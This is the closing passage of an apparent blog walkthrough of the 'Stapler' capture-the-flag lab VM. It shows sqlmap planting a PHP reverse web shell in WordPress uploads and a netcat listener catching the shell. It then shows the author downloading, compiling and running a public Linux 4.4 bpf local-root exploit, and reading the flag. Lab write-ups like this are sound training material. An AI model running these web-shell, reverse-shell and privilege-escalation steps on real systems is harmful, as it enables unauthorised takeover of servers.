</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fingerprinting the back-end DBMS operating system
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;0&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS operating system is Linux
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="k">do</span> you want confirmation that the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> has been successfully written on the back-end DBMS file system <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>? <span class="o">[</span>Y/n<span class="o">]</span> Y
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> and the remote file <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span> have the same size <span class="o">(</span><span class="m">5495</span> B<span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 closed
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! looks like the web shell uploaded successfully.</p>

<p>Now got in and time to get ROOT.</p>

<p>Set up <code>nc</code> to listen on local port <code>443</code> and then trigger the shell to connect back by accessing the web shell page on <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/rsh.php</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.138<span class="o">]</span> 37668
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 16:08:13 up <span class="m">1</span> day,  1:59,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After enumeration, I know the target machine is running Linux Kernel 4.4.0, so by using <code>searchsploit</code> to search any existed vulnerability to against the target machine, and lucky I found one Local Root Exploit which is <a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit"><code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit</code></a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:02<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 192.30.253.113
</span><span class='line'>Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span>192.30.253.113<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">302</span> Found
</span><span class='line'>Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt; <span class="o">[</span>following<span class="o">]</span>
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:03<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 151.101.100.133
</span><span class='line'>Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span>151.101.100.133<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">7115</span> <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip<span class="o">]</span>
</span><span class='line'>Saving to: <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt; 0K ......                                                100% 14.5M<span class="o">=</span>0s
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-08-13 20:17:03 <span class="o">(</span>14.5 MB/s<span class="o">)</span> - <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span> saved <span class="o">[</span>7115/7115<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>unzip 39772.zip
</span><span class='line'>Archive:  39772.zip
</span><span class='line'>   creating: 39772/
</span><span class='line'>  inflating: 39772/.DS_Store       &lt;br/&gt;
</span><span class='line'>   creating: &lt;strong&gt;MACOSX/
</span><span class='line'>   creating: &lt;/strong&gt;MACOSX/39772/
</span><span class='line'>  inflating: &lt;strong&gt;MACOSX/39772/._.DS_Store&lt;br/&gt;
</span><span class='line'>  inflating: 39772/crasher.tar     &lt;br/&gt;
</span><span class='line'>  inflating: &lt;/strong&gt;MACOSX/39772/.&lt;em&gt;crasher.tar&lt;br/&gt;
</span><span class='line'>  inflating: 39772/exploit.tar     &lt;br/&gt;
</span><span class='line'>  inflating: __MACOSX/39772/.&lt;/em&gt;exploit.tar&lt;br/&gt;
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>39772
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>crasher.tar
</span><span class='line'>exploit.tar
</span><span class='line'><span class="nv">$ </span>tar vxf exploit.tar
</span><span class='line'>ebpf_mapfd_doubleput_exploit/
</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>compile.sh
</span><span class='line'>doubleput.c
</span><span class='line'>hello.c
</span><span class='line'>suidhelper.c
</span><span class='line'><span class="nv">$ </span>./compile.sh
</span><span class='line'>doubleput.c: In <span class="k">function</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>make_setuid<span class="p">&amp;</span>rsquo<span class="p">;</span>:
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .insns <span class="o">=</span> <span class="o">(</span>&lt;strong&gt;aligned_u64<span class="o">)</span> insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .license <span class="o">=</span> <span class="o">(</span>&lt;/strong&gt;aligned_u64<span class="o">)</span><span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>               ^
</span><span class='line'><span class="nv">$ </span>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:18 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:17 ..
</span><span class='line'>-rwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">155</span> Apr <span class="m">25</span> 23:25 compile.sh
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">12332</span> Aug <span class="m">13</span> 20:18 doubleput
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">4188</span> Apr <span class="m">25</span> 23:25 doubleput.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">8024</span> Aug <span class="m">13</span> 20:18 hello
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">2186</span> Apr <span class="m">25</span> 23:25 hello.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">7520</span> Aug <span class="m">13</span> 20:18 suidhelper
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">255</span> Apr <span class="m">25</span> 23:25 suidhelper.c
</span><span class='line'><span class="nv">$ </span>./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>id
</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="p">&amp;</span>rsquo<span class="p">;</span>ll have a root shell in <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">60</span> seconds.
</span><span class='line'>suid file detected, launching rootshell<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>we have root privs now<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
</span></code></pre></td></tr></table></div></figure></p>

<p>Brilliant! we now got ROOT and caught the flag file under directory <code>/root/</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@red:/root# ls
</span><span class='line'>ls
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>root@red:/root# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>&lt;del&gt;<span class="p">&amp;</span>lt<span class="p">;</span><span class="o">(</span>Congratulations<span class="o">)</span>&gt;&lt;/del&gt;
</span><span class='line'>                          .-<span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;</span>-.
</span><span class='line'>                          <span class="p">|&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;|</span>
</span><span class='line'>                          <span class="p">|</span>-<span class="p">&amp;</span>hellip<span class="p">;</span>..-<span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>         &lt;em&gt;,.&lt;/em&gt;             <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>    __.o&lt;code&gt;  o&lt;/code&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>-.         <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'> .-O o &lt;code&gt;<span class="s2">&quot;-.o   O )_,._    |       |</span>
</span><span class='line'><span class="s2">( o   O  o )--.-&quot;</span>&lt;/code&gt;O   o<span class="p">&amp;</span>rdquo<span class="p">;</span>-.&lt;code&gt;<span class="s1">&#39;-----&#39;</span>&lt;/code&gt;
</span><span class='line'> <span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;</span>  <span class="o">(</span>   o  O    o<span class="o">)</span>&lt;br/&gt;
</span><span class='line'>              &lt;code&gt;----------&lt;/code&gt;
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@red:/root#
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
</feed>
